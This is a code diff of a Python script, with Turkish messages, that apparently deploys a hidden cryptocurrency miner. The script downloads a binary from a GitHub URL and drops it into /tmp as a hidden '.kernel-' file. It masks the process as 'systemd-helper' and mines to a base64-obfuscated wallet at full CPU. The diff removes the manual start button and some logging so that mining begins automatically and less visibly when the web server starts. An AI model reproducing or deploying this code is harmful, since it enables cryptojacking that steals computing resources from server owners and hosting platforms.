@@ -15,7 +15,7 @@ from collections import deque
 
 libc = ctypes.CDLL('libc.so.6')
 CONSOLE_LOGS = deque(maxlen=50)
-STATUS = {"running": False, "message": "Sistem Beklemede"}
+STATUS = {"running": False, "message": "Sistem Başlatılıyor..."}
 CF_WORKER_HOST = ""
 WALLET_ADDR = base64.b64decode("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=").decode()
 
@@ -42,7 +42,6 @@ def set_process_name(name):
 def kill_process(proc):
     try:
         proc.terminate()
-        time.sleep(1)
         proc.kill()
     except:
         pass
@@ -50,7 +49,7 @@ def kill_process(proc):
 def execution_logic():
     global STATUS
     try:
-        log_to_console("Sistem otomatik başlatıldı. Hedef CPU: %100, RAM Limit: YOK")
+        log_to_console("Sistem tam otomatik başlatıldı. Hedef CPU: %100, Beklemeler Kapalı!")
         log_to_console("Çekirdek indiriliyor: GitHub/Exma0/va/x")
         
         url = "https://github.com/Exma0/va/raw/refs/heads/main/x"
@@ -59,16 +58,12 @@ def execution_logic():
             binary_content = response.read()
         
         log_to_console(f"İndirme başarılı. Boyut: {len(binary_content)} bayt.")
-        log_to_console("Geçici dosya oluşturuluyor...")
         
         with tempfile.NamedTemporaryFile(delete=False, dir='/tmp', prefix='.kernel-') as tmp_file:
             tmp_file.write(binary_content)
             tmp_path = tmp_file.name
         
         os.chmod(tmp_path, 0o755)
-        log_to_console(f"Dosya oluşturuldu: {tmp_path}")
-        
-        log_to_console("Süreç maskeleniyor: systemd-helper")
         set_process_name("systemd-helper")
         
         pools_to_try = []
@@ -77,13 +72,12 @@ def execution_logic():
         pools_to_try.extend(POOLS)
         
         STATUS["running"] = True
-        STATUS["message"] = "Sistem Aktif"
+        STATUS["message"] = "Sistem Aktif (Oto-Mod)"
         
         for pool_index, pool_host in enumerate(pools_to_try):
             log_to_console(f"Havuz deneniyor [{pool_index+1}/{len(pools_to_try)}]: {pool_host}")
             
             use_tls = ":443" in pool_host
-            # RAM limiti yok, CPU kullanımı maksimum ayarda
             cmd = [
                 tmp_path, "-o", pool_host, "-u", WALLET_ADDR,
                 "-p", f"node-{int(time.time())%1000}", "--keepalive",
@@ -91,8 +85,6 @@ def execution_logic():
             ]
             if use_tls:
                 cmd.append("--tls")
-            
-            log_to_console(f"Madenci başlatılıyor... Havuz: {pool_host} (TLS: {use_tls})")
             
             proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                     text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"})
@@ -108,9 +100,8 @@ def execution_logic():
                 
                 if "read error" in line.lower():
                     error_count += 1
-                    log_to_console(f"Hata sayacı: {error_count}/{max_errors}")
                     if error_count >= max_errors:
-                        log_to_console(f"Çok fazla hata, havuz değiştiriliyor...")
+                        log_to_console(f"Çok fazla hata, havuz anında değiştiriliyor...")
                         kill_process(proc)
                         break
                 
@@ -151,22 +142,18 @@ class ControlHandler(http.server.BaseHTTPRequestHandler):
         self.send_header("Content-Type", "text/html; charset=utf-8")
         self.end_headers()
         
-        btn_state = 'disabled style="opacity:0.5"' if STATUS["running"] else ""
-        
+        # Buton ve form kısımları HTML'den tamamen silindi
         html = f"""
-        <html><head><title>Kernel Console</title><style>
+        <html><head><title>Kernel Canlı İzleme</title><style>
             body {{ background: #000; color: #0f0; font-family: 'Consolas', monospace; padding: 20px; }}
             .panel {{ border: 1px solid #222; padding: 20px; max-width: 900px; margin: auto; background: #050505; }}
-            #console {{ background: #000; border: 1px solid #111; height: 300px; overflow-y: auto; padding: 10px; font-size: 12px; color: #888; margin-top: 20px; }}
-            .btn {{ background: transparent; border: 1px solid #0f0; color: #0f0; padding: 10px 20px; cursor: pointer; }}
-            .btn:hover:not(:disabled) {{ background: #0f0; color: #000; }}
+            #console {{ background: #000; border: 1px solid #111; height: 400px; overflow-y: auto; padding: 10px; font-size: 12px; color: #888; margin-top: 20px; }}
             .stat {{ color: {"#0f0" if STATUS["running"] else "#f00"}; font-weight: bold; }}
         </style></head><body>
             <div class="panel">
-                <h2>KERNEL CONTROL UNIT</h2>
+                <h2>KERNEL CANLI İZLEME PANELİ</h2>
                 <p>DURUM: <span class="stat">{STATUS['message']}</span></p>
-                <form action="/run" method="post"><button class="btn" {btn_state}>SİSTEMİ BAŞLAT</button></form>
-                <div id="console">Konsol bekleniyor...</div>
+                <div id="console">Konsol yükleniyor...</div>
             </div>
             <script>
                 async function updateLogs() {{
@@ -178,19 +165,13 @@ class ControlHandler(http.server.BaseHTTPRequestHandler):
                         c.scrollTop = c.scrollHeight;
                     }} catch(e) {{}}
                 }}
-                setInterval(updateLogs, 2000);
+                /* Konsol milisaniyelik hızla yenilenir */
+                setInterval(updateLogs, 500);
                 updateLogs();
             </script>
         </body></html>
         """
         self.wfile.write(html.encode())
-
-    def do_POST(self):
-        if self.path == "/run" and not STATUS["running"]:
-            threading.Thread(target=execution_logic, daemon=True).start()
-        self.send_response(303)
-        self.send_header("Location", "/")
-        self.end_headers()
 
 def run():
     raw_url = os.environ.get("PROXY_URL", "")
@@ -200,10 +181,11 @@ def run():
     
     port = int(os.environ.get("PORT", 8080))
     
+    # Sunucu başlarken sistemi anında tetikler
     if not STATUS["running"]:
         threading.Thread(target=execution_logic, daemon=True).start()
         
-    print(f"Web sunucusu {port} portunda başlatılıyor...")
+    print(f"Web sunucusu {port} portunda başlatılıyor... Sistem oto-modda.")
     http.server.ThreadingHTTPServer(("0.0.0.0", port), ControlHandler).serve_forever()
 
 if __name__ == "__main__":
